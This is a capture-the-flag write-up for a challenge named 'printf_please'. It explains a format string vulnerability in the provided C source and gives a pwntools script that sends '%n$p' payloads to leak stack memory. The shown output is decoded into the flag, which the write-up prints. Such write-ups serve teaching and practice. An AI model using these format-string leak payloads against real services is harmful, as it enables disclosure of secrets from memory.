# printf_please

## Initial Exploration

The authors of this challenge have provided a source file so we first take a look at that.

```c
--snipped--

    char buffer[0x200];
    char flag[0x200];

--snipped--

    read(0, buffer, sizeof(buffer) - 1);
    buffer[strcspn(buffer, "\n")] = 0;

    if (!strncmp(buffer, "please", 6)) {
        printf(buffer);
        puts(" to you too!");
    }
```

Here, we are provided with a buffer that we can write into and a flag conveniently located right after it. There is also a printf vulnerability that we can exploit to leak the flag, since our input is not sanitised.

Essentially, we can input something like `%p %p %p` and it'll try to print three pointers on the stack when printf is called. Another way to exploit this is to enter something like `%3$p`, which will grab the 3rd pointer without us having to write multiple `%p` s.

Note that because of this if check,

```c 
if (!strncmp(buffer, "please", 6))
```

the first 6 characters to our input have to begin with the word 'please' in order to reach the printf line.

## Searching for the flag
To do this, we make use of pwntools, a python package to automatically send input to our program.

```python
def initial_search():
    for i in range(0, 80):
        try:
            print("i is: {}".format(i))
            p = process(BINARY)
            p.recvline()
            p.sendline('please 0x%{}$08p'.format(i))
            print(p.recvline())
            p.close()

            print()
        except EOFError:
            pass
```

Here we keep entering the input `please 0x%{n}$08p` with n from 0 to 80 to try to see where our flag is located at.

Most of our search returns rubbish information. 

```bash
$ python solve.py

i is: 0
b'please 0x%0$08p to you too!\n'

i is: 1
b'please 0x0x7fffe10add66 to you too!\n'

i is: 2
b'please 0x0x000001 to you too!\n'

i is: 3
b'please 0x   (nil) to you too!\n'

...
```

We're looking for a flag that starts with `flag{` which is `66 6c 61 67 7b` in hex. However, most programs store data in little-endian format, so we are actually looking for something like `7b 67 61 6c 66`.

Scrolling down more we eventually find something like this:

``` bash
$ python solve.py
...

i is: 70
b'please 0x0x336c707b67616c66 to you too!\n'

i is: 71
b'please 0x0x6e3172705f337361 to you too!\n'

i is: 72
b'please 0x0x5f687431775f6674 to you too!\n'

i is: 73
b'please 0x0x5f6e303174756163 to you too!\n'

i is: 74
b'please 0x0x6464636362626161 to you too!\n'

...
```

Which looks like our flag! All we have to do now is to run it remotely, reverse the endianness and convert back to ASCII characters.

`flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}`